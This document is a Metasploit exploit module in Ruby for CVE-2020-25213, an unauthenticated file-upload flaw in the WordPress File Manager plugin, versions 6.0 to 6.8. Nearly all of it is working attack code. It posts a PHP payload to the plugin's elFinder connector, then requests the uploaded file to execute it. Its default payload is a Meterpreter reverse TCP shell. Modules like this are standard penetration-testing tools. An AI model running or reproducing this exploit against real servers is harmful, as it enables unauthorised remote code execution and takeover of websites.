class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress File Manager Unauthenticated Remote Code Execution',
        'Description' => %q{
          The File Manager (wp-file-manager) plugin from 6.0 to 6.8 for WordPress allows remote attackers to upload and
          execute arbitrary PHP code because it renames an unsafe example elFinder connector file to have the .php
          extension. This, for example, allows attackers to run the elFinder upload (or mkfile and put) command to write
          PHP code into the wp-content/plugins/wp-file-manager/lib/files/ directory.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Alex Souza (w4fz5uck5)', # initial discovery and PoC
            'Imran E. Dawoodjee <imran [at] threathounds.com>', # msf module
          ],
        'References' =>
          [
            [ 'URL', 'https://github.com/w4fz5uck5/wp-file-manager-0day' ],
            [ 'URL', 'https://www.tenable.com/cve/CVE-2020-25213' ],
            [ 'CVE', '2020-25213' ]
          ],
        'Platform' => [ 'php' ],
        'Privileged' => false,
        'Arch' => ARCH_PHP,
        'Targets' =>
          [
            [
              'WordPress File Manager 6.0-6.8',
              {
                'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' }
              }
            ]
          ],
        'DisclosureDate' => '2020-09-09', # disclosure date on NVD, PoC was published on August 26 2020
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to WordPress installation', '/']),
        OptEnum.new('COMMAND', [true, 'elFinder commands used to exploit the vulnerability', 'upload', %w[upload mkfile+put]])
      ]
    )
  end
 
  def check
    return CheckCode::Unknown unless wordpress_and_online?
 
    # check the plugin version from readme
    check_plugin_version_from_readme('wp-file-manager', '6.9', '6.0')
  end
 
  def exploit
    # base path to File Manager plugin
    file_manager_base_uri = normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wp-file-manager')
    # filename of the file to be uploaded/created
    filename = "#{Rex::Text.rand_text_alphanumeric(6)}.php"
    register_file_for_cleanup(filename)
 
    case datastore['COMMAND']
    when 'upload'
      elfinder_post(file_manager_base_uri, 'upload', 'payload' => payload.encoded, 'filename' => filename)
    when 'mkfile+put'
      elfinder_post(file_manager_base_uri, 'mkfile', 'filename' => filename)
      elfinder_post(file_manager_base_uri, 'put', 'payload' => payload.encoded, 'filename' => filename)
    end
 
    payload_uri = normalize_uri(file_manager_base_uri, 'lib', 'files', filename)
    print_status("#{peer} - Payload is at #{payload_uri}")
    # execute the payload
    send_request_cgi('uri' => normalize_uri(payload_uri))
  end
 
  # make it easier to switch between "upload" and "mkfile+put" exploit methods
  def elfinder_post(file_manager_base_uri, elfinder_cmd, opts = {})
    filename = opts['filename']
 
    # prep for exploit
    post_data = Rex::MIME::Message.new
    post_data.add_part(elfinder_cmd, nil, nil, 'form-data; name="cmd"')
 
    case elfinder_cmd
    when 'upload'
      post_data.add_part('l1_', nil, nil, 'form-data; name="target"')
      post_data.add_part(payload.encoded, 'application/octet-stream', nil, "form-data; name=\"upload[]\"; filename=\"#{filename}\"")
    when 'mkfile'
      post_data.add_part('l1_', nil, nil, 'form-data; name="target"')
      post_data.add_part(filename, nil, nil, 'form-data; name="name"')
    when 'put'
      post_data.add_part("l1_#{Rex::Text.encode_base64(filename)}", nil, nil, 'form-data; name="target"')
      post_data.add_part(payload.encoded, nil, nil, 'form-data; name="content"')
    end
 
    res = send_request_cgi(
      'uri' => normalize_uri(file_manager_base_uri, 'lib', 'php', 'connector.minimal.php'),
      'method' => 'POST',
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => post_data.to_s
    )
 
    fail_with(Failure::Unreachable, "#{peer} - Could not connect") unless res
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP response code: #{res.code}") unless res.code == 200
  end
end
